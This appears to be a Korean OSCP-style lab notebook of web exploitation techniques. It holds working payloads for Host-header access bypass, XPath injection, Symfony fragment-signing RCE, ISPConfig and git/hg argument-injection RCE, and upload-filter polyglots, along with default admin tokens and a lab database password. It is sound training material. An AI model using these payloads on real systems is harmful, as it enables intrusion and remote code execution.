- **판정은 «두 층»으로** — 바깥 200 은 batch 엔드포인트가 요청을 받았다는 뜻일 뿐임. 우회 성공은 **하위 응답의 `"status"`** 로 판정할 것(A-12)
- **기본 자격증명은 웹 로그인 폼에만 있는 것이 아님.** API 토큰·관리 키도 기본값이 있고 문서와 배포본에 그대로 적혀 있음(APISIX 2.8 = `edd1c9f034335f136f87ad84b625c8f1`, viewer 는 `4054f7cf07e344346cd3f287985e76a2`). **서비스를 식별했으면 「이 제품의 기본 관리 토큰이 뭔가」를 검색할 것**(B-1-37)

**출처** — [[Robust]](`X-Forwarded-For: 10.10.10.x` → 로그인 폼 노출) · [[Flimsy]](batch-requests 재발행).

**⚠️ 반대 방향 — 앱이 «스스로» 프록시를 켜서 자기 접근제어를 우회시킴.** 헤더를 위조하는 것이 아니라 **소켓 출발지 자체가 `127.0.0.1` 로 바뀌는** 경우임. [[pyLoader]] 실측:
- `/flash/addcrypted2` 의 유일한 접근제어 `@local_check` 가 `REMOTE_ADDR in ("127.0.0.1", "::ffff:127.0.0.1", "::1", "localhost")` **또는** `HTTP_HOST in ("127.0.0.1:9666", "[::1]:9666")` 이면 통과
- 그런데 pyLoad **기본 탑재** 애드온 `ClickNLoad` 가 `enabled=True`·`port=9666`·`extern=True` 기본값으로 `0.0.0.0:9666` 을 열고 `backend_socket.connect(("127.0.0.1", 8000))` 으로 **원시 TCP 포워딩**함. HTTP 를 해석하지 않으므로 헤더를 가공하지도 않음
- 결과 — 원격 요청이 백엔드에 도달할 때 `REMOTE_ADDR = "127.0.0.1"`. **보안 검사와 그것을 우회시키는 기능이 같은 제품 안에 기본값으로 공존함**

→ **판정 기준은 하나 — 이 검사가 출발지 IP 를 믿는다면 «그 IP 를 바꿔줄 중간 홉»이 있는지 찾을 것.** 있으면 검사는 없는 것임. 리버스 프록시·로드밸런서·Kubernetes Service·SSRF 가 전부 같은 효과를 냄. [[Squid]] 의 오픈 프록시가 같은 구조인데 거기서는 **공격자가** 프록시를 이용했고 여기서는 **앱이** 프록시를 제공함.

**⛔ `or` 로 묶인 접근제어는 가장 약한 가지만큼만 강함.** `HTTP_HOST` 는 클라이언트가 보낸 `Host:` 헤더이므로 전적으로 우리 통제 아래 있음. **프록시가 없어 `REMOTE_ADDR` 이 우리 IP 로 남아도 헤더 한 줄로 두 번째 가지를 만족시킴:**
```bash
curl -s -X POST -H 'Host: 127.0.0.1:9666' --data-binary '<페이로드>' \
  'http://TARGET:9666/flash/addcrypted2'
```
이 Host 헤더 우회는 CVE-2023-0297 시점에 고쳐지지 않았고, 벤더가 CVE-2024-39205 에서 인정한 뒤 2026-03 에야 `"[CNL] add host header check"` 커밋으로 손봄. **`403 Forbidden` 을 만나면 이것이 첫 수임**(A-2-29).

#### B-16. XPath injection

**탐지 신호** — 검색·조회 폼인데 백엔드가 DB 가 아니라 **XML 파일**. SQLi 페이로드가 전부 안 먹는데 `'` 하나로 결과가 달라지면 의심할 것.

**SQLi 와 형제지만 별도 클래스임.** `contains(field,'$x')` 형태의 쿼리에:
```text
x') or ('1'='1          ← 전체 덤프
substring(*[n],i,1)='c' ← blind 로 필드 단위 추출
```
sqlmap 은 시험 금지지만(E 절) **이건 애초에 수동임.**

**핵심 교훈 — DB 해시와 «별개의» 평문 저장소.** [[Wheels]]: 로그인 DB 는 bcrypt 였으나 포털이 실제로 참조한 것은 **XML 파일**이었고 거기 6명 전원의 비번이 평문으로 있었음. **bcrypt 우회가 통째로 불필요했음**(A-22).

**게이트도 함께 볼 것** — 포털이 `Access Denied` 만 뱉으면 역할 컬럼만이 게이트가 아님. **가입 이메일 도메인·가입 순서·히든 필드**를 의심할 것(A-21).

⚠️ **반증 사례 — 주입 자리처럼 보여도 «직후 동등검사» 한 줄이면 무력화됨.** [[Monster]] 의 Monstra 로그인·비밀번호 재설정은 `select("[login='...']")` 라 XPath 인젝션 자리로 보이나, **바로 다음 줄**의 `$user['login'] == Request::post('login')`(재설정은 `$user['hash'] == $_GET['hash']`)이 막음. 인젝션 문자열을 넣으면 반환된 사용자의 필드와 POST 원문이 달라져 통과하지 못함.
→ **주입 자리를 찾았으면 «반환값을 다시 검사하는 코드가 있는지»까지 읽고 나서 시간을 배분할 것.** 소스가 손에 있는데 두드리기부터 하는 것이 A-2-25 의 실패임.

**출처** — [[Wheels]](`portal.php` XPath, `works.xml` 평문 6명) · [[Monster]](반증 사례).

#### B-17. Symfony dev 프론트컨트롤러 → `_fragment` 서명 위조 RCE

**탐지 신호** — `robots.txt` 의 `Disallow: /app_dev.php` 가 그 자체로 신호. 프로덕션에 dev 진입점이 남으면 `_profiler` 가 통째로 열림.

**체인**
1. `app_dev.php/_profiler/...` 로 프로파일러 접근 → `parameters.yml` 의 앱 `secret` 회수
2. `secret` 으로 `UriSigner` 의 HMAC 을 **로컬에서 위조** — `hash_hmac('sha256', uri, secret, true)` → base64
3. `_path` 이중 인코딩 → 서명만 맞으면 **임의 PHP 콜러블 호출**

⚠️ **인자 시그니처가 단순한 함수부터 쏠 것.** [[Fractal]]: `system`/`passthru`/`exec` 컨트롤러가 전부 실패 —
```text
Controller "system" requires that you provide a value for the "$return_value" argument
```
2번째 인자를 채워 재시도하면 이번엔 `Warning: Parameter 2 to system() expected to be a reference, value given` 로 죽음 — **참조 인자라 프래그먼트로는 못 넘김.** **`shell_exec` 는 인자 하나뿐**이라 바로 통했음. 후보를 배치로 던져 diff 한 덕에 순차 삽질 없이 판별했음(`frag/` 에 응답 14개 보존).

**성공해도 HTTP 500 임** — A-12 참조.

**출처** — [[Fractal]].

#### B-18. 번들 서드파티 컴포넌트가 진짜 취약점이다

**앱 버전이 최신이어도 `vendor/`·`node_modules/`·`/plugins/` 아래 데모·테스트 페이지가 웹에서 접근 가능하면 그게 진입점임.** 애플리케이션 버전만 보고 판단하면 놓침.

[[GLPI]] — GLPI 10.0.2 본체가 아니라 `vendor/` 아래 **htmLawed 1.2.6 의 테스트 페이지**가 인증 없이 노출돼 RCE. 고정 경로:
```text
/vendor/htmlawed/htmlawed/htmLawedTest.php
```

**출처** — [[GLPI]](CVE-2022-35914, 수정 버전 **10.0.3 · 9.5.9**).

#### B-19. Rails 매스어사인먼트 (strong parameters)

**탐지 신호** — 가입 폼에 `user[...]` **중첩 파라미터**가 보이면 즉시 의심. Rails·Laravel 공통.

**`permit` 목록에 권한 필드가 섞여 있으면 가입 요청에 한 줄 얹는 것으로 승격됨.** 시도할 필드는 `role`·`admin`·`is_admin`·`user_type`·`group_id` — **후보가 유한하니 하나씩 말고 배치로 쏘고 결과를 대조할 것**(D 절).

**앱이 정답 값을 알려주는 경우가 많음.** [[Assignment]]: `/users/1` 이 jane 의 role 문자열 `owner` 를 그대로 렌더했음. **권한 필드를 «표시»하는 화면이 곧 «값의 사전»임.**

**곁들여 볼 것** — 인가 검사와 열거 엔드포인트의 분리. [[Assignment]] 은 회원 목록이 사용자 ID 를 그대로 노출하고, 노트 조회는 **role 문자열 하나로** 갈렸음.

**출처** — [[Assignment]](`applicants_controller.rb`·`notes_controller.rb`).

---

#### B-1-10. ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE

**탐지 신호** — 무인증 CCTV/감시 웹앱(`?view=` 라우팅), `OPT_USE_AUTH` 꺼짐. `?view=console`·`?view=options`·`?view=version` 이 로그인 없이 200.

**RCE sink** — Filter 의 `AutoExecuteCmd` 가 매칭 Event 마다 `zmfilter.pl` 의 `qx()`(백틱)로 실행됨. 실행 조건이 Event 매칭이므로 **먼저 Monitor 를 하나 만들어 Event 를 계속 생성**시켜야 필터가 반복 실행됨(`Function=Mocord` 등).

**페이로드 주의** — CSRF 토큰 처리 필요(`csrf-magic`: 먼저 GET 해 세션쿠키+토큰 수령 후 같은 쿠키로 POST). `AutoExecuteCmd` 저장값에 **PHP7 느슨비교 타입저글링 함정**이 있어 숫자 접두가 필요함(A-26 참조).

**자매 사례** — 같은 무인증 조건, 다른 RCE 경로.

| 박스 | 버전 | 경로 |
|---|---|---|
| [[Cobbles]] | 1.34.23 | Filter `AutoExecuteCmd` → `zmfilter.pl` 의 `qx()`. PHP7 느슨비교 타입저글링을 숫자 접두로 우회 |
| [[Pebbles]] | 1.29.0 | `limit` 파라미터 **pre-auth SQLi**(스택 쿼리 성립) → time-based blind + `LOAD_FILE`. 코드 실행까지 가지 않음 |
| [[Pelican]] | ZooKeeper 3.4.6 + Exhibitor(버전 미상, 1.0.9~1.7.1 범위 내 취약) | Config 탭 `java.env script` 필드에 `$( )`·백틱 삽입 → ZooKeeper 재기동 시 셸에서 평가(CVE-2019-5029). Exhibitor 가 ZooKeeper 기동 주체라 **설정 편집 권한 = 코드 실행 권한** |

**1.29 계열은 `limit` 이 여러 view 에서 정수 검증 없이 쿼리에 이어붙음** — `view=events`(hidden 필드) · `view=filter`(사용자 입력) · `view=request&request=log&task=query`(로그 조회 API) 셋 다. 무인증 ZoneMinder 를 만나면 **버전부터 확인하고 두 경로를 다 재 볼 것** — 1.29 면 SQLi 가 더 빠르고, 1.3x 면 Filter 훅이 그대로 RCE 임.

**무인증 판정법** — 로그인·쿠키·CSRF 토큰 없이 `?view=console`·`?view=version` 을 `curl` 해 200 + 데이터가 나오는지. [[Pebbles]] 는 `blind.py` 가 **인증 절차를 하나도 안 거치고** 로그 조회 API 만 두들겨 DB 를 통째로 뽑았다는 것 자체가 pre-auth 증거임.

관리 훅·스크립트 실행 기능이 있는 감시·모니터링 웹앱(Cacti·Nagios·LibreNMS 류) 전반에 같은 접근(무인증이면 훅=RCE)이 적용됨.

**감독(supervisor) UI 가 대상 프로세스를 «기동»하는 구조**(Exhibitor→ZooKeeper, Jenkins→빌드 에이전트, systemd 유닛 편집 UI)에서는 별도 CVE 없이도 RCE 가 성립함. 판정 순서 셋 — ① 관리 UI 가 로그인을 안 묻는가 ② 그 UI 가 하위 프로세스를 기동·재기동하는가 ③ 그 기동 경로에 사용자가 넣은 문자열이 이스케이프 없이 들어가는가. **셋 다 예면 정상 기능이 곧 코드 실행임.**
→ **「로그인 화면이 없다」는 「인증이 없다」는 뜻임.** 별도 취약점을 찾기 전에 UI 가 제공하는 정상 기능부터 훑을 것 — 설정 편집 · 스크립트 실행 · 플러그인 업로드 · 백업 복원 · 로그 경로 지정 · 명령 정의. Exhibitor 는 인증 기능 자체가 없고 1.7.0 이전에는 바인딩 인터페이스 지정 기능조차 없었음(기본 포트 **8080**).
⚠️ **주입은 기존 값을 «지우지 말고» 덧붙일 것.** [[Pelican]] 의 `java.env script` 필드에는 원래 `export JAVA_OPTS="-Xms1000m -Xmx1000m"` 가 들어 있었고 페이로드는 그 뒤에 붙었음 — 원값을 날리면 대상 프로세스가 아예 안 뜨는 수가 있음.

— 출처: [[Cobbles]](공개 CVE 아님 — 정상기능 오남용) · `zm-src/scripts/zmfilter.pl.in:998-1011` · [[Pelican]](Exhibitor)

#### B-1-11. 후보 파라미터 이름은 배치로 쏜다 — 대조군 필수

순차로 찔러보지 말 것. [[BossPlayersCTF]]: `cmd`·`command`·`exec`·`c`·`query`·`shell`·`code`·`system` 8종을 동시에 쏘고 응답을 `grep -l`/`diff`/md5 로 골라냄.

**무파라미터 대조군을 반드시 같이 받아둘 것** — 그게 없으면 「271바이트」가 정상인지 오류인지 판정할 기준이 없음. 이 박스에서는 무반응 7종 + 대조군이 md5 까지 완전히 동일(`e90a614e7e94ce1f9eb40e4b43fef152`)했고 `cmd` 만 325B 로 갈렸음. 순차로 8번 왕복했을 것을 배치 사격 한 번으로 끝냄.

```sh
for p in cmd command exec c query shell code system; do
  curl -s "http://$T/workinginprogress.php?$p=id" -o "param_$p.html"
done
curl -s "http://$T/workinginprogress.php" -o wip_noparam.html   # 대조군 필수
md5sum param_*.html wip_noparam.html
```

**같은 사격으로 «업로드 파라미터명»도 뽑힘 — 응답 문구 차이가 곧 열거 오라클임.** 폼을 못 보더라도 응답이 입력에 따라 달라지면 그 차이로 파라미터명·존재 여부를 알 수 있음. 최소 유효 페이로드(예: 20바이트 JPEG)를 후보명으로 반복 전송해 문구를 비교할 것.
```sh
for n in myFile file image upload fileToUpload userfile document; do
  echo -n "$n: "; curl -s -F "$n=@/tmp/t.jpg" http://<타겟>/exiftest.php
done
```
```text
myFile: File uploaded successfully :)
file: There is no file to upload.
```
— 출처: [[Exghost]]. **한 글자 차이로 폼을 못 봐도 파라미터명이 특정됨.**
→ 일반화: **응답이 입력에 따라 달라지는 모든 지점이 열거 오라클임.** 로그인 폼의 「없는 사용자」 vs 「비밀번호 틀림」, SQLi blind, 파일 존재 확인이 전부 같은 「차이가 곧 정보」의 변형임. 후보가 많으면 판정식(문구 grep 또는 `curl -w %{time_total}`)으로 바꿔 자동화할 것.

#### B-1-12. PHP 언어파일(`.lng`)은 «실행되는 코드»다

**탐지 신호** — 관리 패널에 번역·언어파일 편집기가 있음. `.lng`·`.php` 로 저장되는 번역·설정 파일은 `$wb[...] = ...;` 형태의 **PHP 스크립트**인 경우가 많고, 앱이 그것을 `include` 함.

- **여기에 키를 주입하면 `include` 되는 순간 RCE**
- 반환값이 배열 키의 일부가 되어 폼에 렌더되면 **출력 회수 채널**까지 됨(별도 채널 불필요)

**페이로드 형태** — `]` 를 쓰지 말고 문자열 연결로 리터럴을 탈출할 것:
```text
records[x'.shell_exec('<명령> 2>&1').']=zz
```

⚠️ **PHP 는 `name="records[...]"` 형태 파라미터의 배열 키를 «첫 `]` 에서 잘라내고 뒤를 버림.** `]` 로 구문을 끊는 공개 PoC 방식은 여기서 파일을 깨뜨림(A-27). Kali 재현 — `php -r '$s="records[x%27%5D+...%27y]=zz"; parse_str($s,$o); var_dump($o);'`. `parse_str` 은 POST 와 같은 `php_register_variable_ex` 경로라 로컬 재현이 서버 동작과 일치함.

**출처** — [[CVE-2023-46818]](ISPConfig < 3.2.11p1, `admin/language_edit.php`).

#### B-1-13. 입력 필터는 «위치별»로 때려본다

**같은 폼이라도 값(value)은 필터하면서 배열 키(key)는 그대로 파일에 쓰는 비대칭 결함이 실재함.** 값이 막혔다고 **폼 전체가 막힌 것은 아님**(A-29).

별도로 시험할 「덜 검증되는 자리」 — 배열 **키** · HTTP **헤더** · **파라미터명** 자체 · 파일명 · 정렬/필드 지정 파라미터.

「어디가 걸러지고 어디가 안 걸러지는가」는 **위치별로 실측해야** 보임. **출처** — [[CVE-2023-46818]].

#### B-1-14. CSRF 벽은 토큰을 실시간 파싱해 넘는다

저장 직전 편집 페이지 GET → 정규식으로 `_csrf_id`/`_csrf_key` 추출 → POST 에 동봉.

- `sqlmap` 등 **자동 도구 없이 순수 `requests`/`curl` 로 재현 가능** — 수동 대안이 원래 이 방식임(E 절)
- 세션 유지가 전제 — `requests.Session()` 또는 `curl -b/-c` 쿠키 jar
- ⚠️ 익스플로잇으로 대상 페이지를 깨뜨리면 **그 페이지에서 토큰을 못 받게 됨** — 토큰 스코프를 재고 다른 정상 리소스를 공급원으로 쓸 것(A-28)

**phpMyAdmin 도 같은 함정 — 그리고 실패가 «조용함».** 요청마다 `token` 이 갱신되므로 로그인 페이지에서 뽑은 토큰을 다음 요청(`import.php` 등)에 그대로 재사용하면 **에러 없이 로그인 페이지로 되돌아옴** — 「실행됐는데 결과가 없다」처럼 보임. 해결은 동일 — **로그인 «응답 본문»에서 새 토큰을 다시 파싱해 쓸 것.**
웹앱 자동화의 3대 함정을 한 줄로 — ①CSRF 토큰이 매 요청 갱신 ②세션 쿠키 미유지 ③**환경변수 프록시가 끼어듦**. 셋째는 `requests.Session()` 에 `trust_env = False` 를 주면 막힘(`http_proxy`·`https_proxy` 가 걸려 있으면 요청이 조용히 엉뚱한 곳으로 나감).

**출처** — [[CVE-2023-46818]](ZoneMinder) · [[Squid]](phpMyAdmin 5.0.2, 프록시 경유 자동화).

**CSRF·nonce 토큰이 로그인 «전»에 보이면 그 자체가 결함임.** 토큰은 인증된 세션에 묶여야 의미가 있고, 로그인 폼에 박힌 토큰이 관리자 기능에도 그대로 통한다면 그것은 방어가 아니라 **한 단계 더 긁어와야 하는 값**일 뿐임.
```bash
curl -s http://TARGET/grav-admin/admin | grep -oE 'admin-nonce" value="[a-f0-9]+"'
```
```text
admin-nonce" value="93d260b5a6f8507c947d6124d1dd158f"
```
— 출처: [[Astronaut]] `~/PG/Astronaut/admin.html`

**토큰이 방어로 성립하려면 셋이 «모두» 필요함:**

| 요구 조건 | Grav admin 1.10.7 의 실제 |
|---|---|
| ① 세션에 **바인딩**됨 | **미충족** — 비인증 페이지의 토큰이 관리자 태스크에서 통함 |
| ② 공격자가 **읽을 수 없음**(동일 출처 정책 의존) | **미충족** — 인증 없이 `curl` 한 줄로 읽힘 |
| ③ 검증 **실패 시 부작용 없음** | 검증은 통과했으므로 무관. 다만 인가 실패 시에도 부작용이 남음(A-12) |

⛔ **CSRF 토큰은 「제3자 사이트가 «사용자를 시켜» 요청을 보내는 것」을 막는 장치이지 「공격자가 «직접» 요청을 보내는 것」을 막는 장치가 아님.**
→ **익스플로잇을 실행하기 «전에» 이 한 줄로 전제조건 충족 여부를 먼저 볼 것.** 안 나오면 그 경로는 버려야 함 — 던지고 나서 왜 안 되는지 고민하는 것보다 훨씬 쌈.
⚠️ nonce 는 요청마다 바뀜 — **스크립트가 값을 캐싱하면 재시도가 실패함.**


**1회용 토큰은 실패의 대가가 큼.** [[plum]] 의 PluXml 은 토큰을 **소비 즉시 폐기**하고, 없는 토큰이 오면 `unset($_SESSION['formtoken'])` 로 **그 세션의 토큰을 전부 날린 뒤** `die()` 함 — 한 번 실수하면 그 세션의 모든 폼이 죽어 **로그인부터 다시** 해야 함.
⚠️ 게다가 `die('Security error : invalid or expired token')` 는 **200 응답**으로 옴 — 상태 코드만 보면 성공처럼 보임(A-12). **자동화가 이상하면 응답 본문을 파일로 통째로 저장해 눈으로 볼 것.**
**웹앱 자동화에서 걸리는 함정은 대개 셋임** — ⑴ CSRF 토큰이 1회용이거나 매 요청 갱신됨([[plum]] · [[Squid]] phpMyAdmin) ⑵ 세션 쿠키 미유지(`requests.Session()` 필수) ⑶ 환경변수 프록시 개입(`trust_env=False`, [[Squid]]). **셋 다 HTTP 에러가 아니라 「엉뚱한 페이지」로 나타나서 원인 찾기가 오래 걸림.**
**패턴 — 「저장」 전에 「불러오기」를 한 번 더 치는 2단계 POST.** 첫 요청의 목적은 파일을 여는 것이 아니라 **새 토큰을 받는 것**임.

#### B-1-15. GraphQL introspection → 인자 주입

**엔드포인트 찾기 — REST 스캐너 사고를 그대로 쓰면 안 됨.** gobuster·경로 프로빙이 찾는 것은 「경로」인데 GraphQL 은 **경로 하나에 쿼리 본문으로 전부 접근**함. 경로 배치 프로빙은 **엔드포인트를 찾는 데만** 쓰고, 찾은 뒤에는 introspection 으로 전환할 것.

후보 경로 18종을 배치로 GET 하고 **응답 크기로 diff.** 지문은 이 문구임:
```json
{"errors":[{"message":"Must provide query string."}]}
```
경로는 존재하는데 쿼리 파라미터가 없을 때 GraphQL 엔진(예: `express-graphql`)이 내는 오류라 404 와 확실히 갈림.
⚠️ `app.use('/graphql', …)` 로 마운트되면 **하위 경로도 같은 응답**을 냄. 응답한 경로가 여럿이어도 엔드포인트는 하나일 수 있음.

**스키마 뽑기 — 두 줄을 손에 익힐 것.**
```graphql
{__schema{queryType{name}mutationType{name}types{name kind}}}
{__type(name:"Query"){fields{name args{name type{name kind ofType{name}}}type{name kind ofType{name}}}}}
```
앞줄로 존재 확인, 뒷줄로 **필드명·인자명·타입**까지 확보. GraphiQL/Playground UI 가 꺼져 있어도 introspection 쿼리 자체는 별도 설정이 없으면 열려 있는 경우가 많음.

**읽는 법 둘**
- `mutationType` 이 `null` 이면 쓰기 작업(계정 생성 등)은 이 스키마로 불가 — 처음부터 「읽기 쪽 필드에서 무엇을 새어 나오게 할까」로 방향을 잡을 것
- 반환 타입이 객체가 아니라 **문자열 리스트(`[String]`)**면 특이 신호임. 정상 스키마라면 `User { username, … }` 객체를 돌려주는 편이 자연스러움 — 문자열 배열은 「이름」과 「이름:해시」가 한 배열에 섞여 나오는 형태와 맞물림(B-12)

**수동이 기본임** — GraphQL 은 `sqlmap` 류가 다루지 못하는 영역이라 OSCP 자동 도구 금지 규정과 애초에 충돌하지 않음. [[Graph]] 는 전 구간 `curl` POST 로 진행됨. **GraphQL introspection + 인자 주입은 OSCP 최신 출제 경향(웹 API)과 맞닿아 있음.**

**출처** — [[Graph]].

#### B-1-16. CLI 인자 주입(argument injection) — 웹 값이 argv 로 흘러가는 자리

**셸 메타문자 삽입(고전 커맨드 인젝션)과 다름.** 프로그램이 `subprocess`(shell=False)로 «안전하게» 호출해도, **사용자 값이 argv 한 칸을 통째로 차지하면** 대상 프로그램이 그 값을 **옵션으로 해석**함. 값이 `-` 로 시작하기만 하면 됨.

**후보** — git·hg·curl·tar 처럼 옵션이 풍부한 CLI 를 감싸는 웹앱 전부. 값이 흘러가는 자리는 **저장소 URL · 브랜치명 · 파일명 · 호스트명**.

**대표 페이로드**

| 프로그램 | 페이로드 |
|---|---|
| git | `fetch --upload-pack=<cmd>` · `push --exec=<cmd>` |
| hg | `--config=alias.X=!<cmd>`(hg alias 의 `!` 는 「뒤는 셸 명령」) |
| tar | `--checkpoint-action=exec=<cmd>`(B-38) |
| curl | `-o <파일>` |

[[Fikklish]] 두 사례:
- **Weblate ≤4.11(CVE-2022-23915)** — 컴포넌트의 VCS 저장소 URL·브랜치명을 검증 없이 git/hg 인자로 전달. `--config=alias.pull=!<cmd>`. ⚠️ **응답이 실패(fatal)여도 명령은 이미 실행됨** — 응답으로 성공/실패를 판정하지 말 것(A-12)
- **ruby-git 1.10.2(CVE-2022-25648)** — `Git::Base#fetch(origin, {ref:...})` 가 `git fetch <origin> <ref>` 로 조립하는데 **두 값 다 미검증**. `--upload-pack=<cmd>` 가 로컬 전송(local transport)에서 실행 훅으로 그대로 실행됨. git 은 **옵션 위치를 가리지 않아** 입력이 한 칸 밀려도(`origin`↔`ref` 뒤바뀜) 통함. **타겟 없이 로컬 재현 가능** — `git fetch poc --upload-pack='sh -c "touch /tmp/x"'`

→ **반사: `sudo -l` 이 스크립트를 가리키면 본문만 보지 말고 `require`/`import` 한 라이브러리의 버전까지 볼 것**(A-43). GraphQL 뒤에서 같은 일이 일어나는 형태는 B-1-15.

#### B-1-17. 정적 템플릿 사이트에서 «손댄 문단»은 자격증명 힌트다

공개 웹 템플릿(FreeHTML5 류)을 그대로 쓴 사이트는 **원본과 본문을 대조하면 손댄 곳이 바로 드러남.** 원본 템플릿을 내려받아 diff 하거나, README·푸터의 라이선스 문구가 그대로면 나머지도 원본일 가능성이 높음.

[[Fikklish]] — "Book Bargains Online" 사이트에 **원본에 없는 "Editors Note"** 문단(소설 속 인물명 노출)이 있었고, 그것이 그대로 admin 비밀번호 힌트였음.

`[가정]` `Last-Modified` 헤더로 「손댄 파일만 최신인지」 비교하는 방법도 유효할 수 있으나, **이 박스에서 그 비교를 한 기록은 없음**(관측 없음). 실제 판단 근거는 **README 원본과의 본문 대조**뿐이었음.

→ **웹 본문의 손댄 문단은 전부 자격증명 힌트로 취급할 것.** 후보가 3~5개로 줄면 레이트리밋 박스에서도 승산이 생김(A-2-12).

#### B-1-18. SVG 아이콘 캡차는 `path` 데이터로 연산자를 판정한다

가입 폼 캡차가 `What is 15 <svg>…</svg> 8?` 처럼 **연산자를 SVG 아이콘으로** 그리는 경우가 있음. 정규식으로 숫자를 긁으면 **SVG path 안의 좌표 숫자까지 딸려와** 계속 틀림 — `d` 속성 앞부분으로 판정할 것.

| path 시작 | 연산 |
|---|---|
| `M19,13H5V11H19V13Z` | 빼기 |
| `M19,6.41L17.59,5L12,10.59...`(X 아이콘) | 곱하기 |
| 그 외 | 더하기 |

[[Fikklish]] — 곱하기가 있다는 것을 몰라 한 번 더 틀렸음(약 8분). 결과적으로 이 작업 전체가 A-2-11 의 헛다리였으나 **파싱 조각 자체는 재사용 가능**함(`/tmp/reg2.py`, Kali 산출물에는 미보존).

#### B-1-19. `LIKE '%…%'` 로 짠 로그인 쿼리는 그 자체가 인증 우회다

**SQL 인젝션이 아니어도 성립함.** 페이로드도, 주석 문자도, 인용부호 탈출도 필요 없음 — **와일드카드 문자를 그냥 입력하면 됨.** 개발자가 「검색 기능 헬퍼를 로그인에도 썼다」는 식으로 나오는 실수라 실무에서도 종종 보임.

→ **로그인 폼을 만나면 `'` 를 넣기 전에 `%` 하나, 그리고 빈 값 제출을 먼저 해볼 것.** 응답이 달라지면 `LIKE` 임. 비용이 거의 0임.

에러 메시지가 노출되면 원본 쿼리 구조를 되짚을 수 있음 — [[Cockpit]] 은 `'` 하나로 `LIKE '%…%' AND password like '%…%'` 전체 구조가 드러났음. 수동 UNION 으로 넘어갈 때의 절차는 B-12.

#### B-1-20. 검증하는 파서 ≠ 처리하는 파서 — 업로드 필터는 그 틈으로 넘는다

**입구에서 검사하는 로직(확장자·MIME 화이트리스트)과 실제로 데이터를 소비하는 로직(내부 라이브러리 파서)이 서로 다른 규칙으로 파일을 해석하면 그 틈으로 페이로드가 지나감.**

전형 — ⓐ 확장자로 막지만 내용은 실행 엔진이 파싱(폴리글롯 파일) ⓑ `Content-Type` 으로 막지만 라이브러리는 **매직 바이트**로 판단.

[[Exghost]](CVE-2021-22204, ExifTool):
```text
겉면(파일 헤더·확장자)  →  JPEG(FFD8...)  →  PHP 의 MIME 화이트리스트(image/jpeg) 통과
속(EXIF 태그 내부)      →  DjVu ANT 청크  →  ExifTool 이 매직 바이트로 찾아 파싱 → Perl eval 실행
```

→ **판정 질문은 하나 — 「무엇이 검증하고 무엇이 실행하는가」.** 둘이 다르면 이 틈을 의심할 것.

**형제 사례 — 3중 검사가 각각 «다른 곳»만 보는 고전형.** [[PwnLab]] `upload.php`:

| 검사 | 보는 것 | 우회 |
|---|---|---|
| `strrchr($filename,'.')` 화이트리스트 | 파일명의 마지막 점 이후 | 파일명을 `.gif` 로 |
| `strpos($filetype,'image')` | 클라이언트가 보낸 `Content-Type` | 우리가 정하는 값 |
| `getimagesize()['mime']` | 파일 «내용»의 매직바이트 | GIF 헤더를 앞에 붙임 |

`GIF89a` 헤더 + PHP 태그 폴리글롯이 세 검사를 동시에 통과 — PHP 인터프리터는 파일 앞쪽 쓰레기를 무시하고 `<?php` 부터 실행하므로 확장자가 `.gif` 로 남아도 무방함.
⚠️ **다만 조건이 하나 더 필요함** — 이 우회가 성립한 것은 직접 요청(Apache 가 `.gif` 를 PHP 로 실행하지 않음)이 아니라 **별개의 `include()` 로 읽혔기 때문**임. include 는 확장자를 안 봄. 즉 **「실행 경로가 확장자 기반이 아닌 include/require」**가 전제임(B-1-38).
— 출처: `~/PG/PwnLab/src_upload.php`

#### B-1-21. 노출된 소스를 «먼저» 확보한다 — 화이트박스가 블랙박스보다 압도적으로 빠르다

**정황** — `.git` 유출 · 백업 zip · 공유 스토리지의 아카이브 · 공개 저장소. 보이면 **다른 것보다 먼저** 확보할 것.

[[Hawat]] — 50080 Nextcloud 가 `admin:admin` 으로 열렸고 그 안에 `issuetracker.zip`(애플리케이션 전체 소스)이 있었음. 소스 확보·리뷰에 시간이 들었지만 그 덕에 **주입을 던지기 전에** ①취약 지점 1곳 확정 ②출력 채널 3개가 전부 죽었다는 판정 ③자가 가입 경로 ④DB 자격증명을 전부 얻었음. 블랙박스로 blind SQLi 를 찾는 것보다 훨씬 빠름.

**소스를 손에 넣으면 순서대로 볼 것:**
1. **원시 SQL 조립 지점** — `grep -rn -iE 'createQuery|createNativeQuery|Statement|executeQuery|jdbcTemplate|@Query' --include='*.java' .`
   [[Hawat]] 은 이 grep 이 **`IssueController.java` 한 곳만** 뱉었음. 나머지는 전부 Spring Data JPA(파라미터 바인딩)라 안전
2. **Spring Security 설정** — `permitAll` 목록과 `csrf()` 상태. [[Hawat]] 은 `/register`·`POST /user/register` 가 `permitAll` + `csrf().disable()` 이라 **자가 가입이 열려 있었고 curl 한 줄로 세션을 얻음**
   ```java
        .csrf().disable()
       .authorizeRequests()
           .antMatchers("/", "/index", "/register", "/user/register", "/css/**", "/js/**").permitAll()
           .anyRequest().authenticated()
   ```
3. **DB 자격증명·JDBC URL** — `application.properties`·`application.yml`. [[Hawat]] 은 `issue_user` / `ManagementInsideOld797` 이 컨트롤러와 properties 양쪽에 평문. URL 의 `allowMultiQueries` 유무도 여기서 봄
4. **엔티티의 원시형 필드** — 폼 필드 하나가 빠지면 400 이 나는 원인이 여기 있음. `[가정]` [[Hawat]] `Users.userId` 가 `int` 원시형이고 `user_form.html` 이 그것을 hidden 으로 실어 보냄. 소스로 확인되는 것은 **빈 값 전송 시** 원시형 바인딩이 실패한다는 것까지이고, 파라미터를 «아예 생략한» 요청의 응답은 산출물에 없음. 그래도 **「가입 폼이 400 을 뱉는다 = 막혔다」가 아니라 「필드가 모자란 것」**일 수 있다는 반사는 유효함

⚠️ **소스의 「어떻게 호출하는가」는 배포본과 다를 수 있음**(A-2-13 소스≠배포본).

#### B-1-22. Nextcloud · ownCloud 를 만나면 WebDAV 를 직접 때린다

**경로 관례** — `/remote.php/dav/files/<사용자명>/` 이 그 사용자의 파일 루트임. `PROPFIND` 로 목록, `GET` 으로 다운로드, `PUT` 으로 업로드.

**웹 UI 를 거치지 않으므로 세션·CSRF 처리가 불필요**함 — 그대로 자동화됨.
```bash
curl -u admin:admin -X PROPFIND \
  'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/'
curl -u admin:admin -o issuetracker.zip \
  'http://192.168.248.147:50080/cloud/remote.php/dav/files/admin/issuetracker.zip'
```
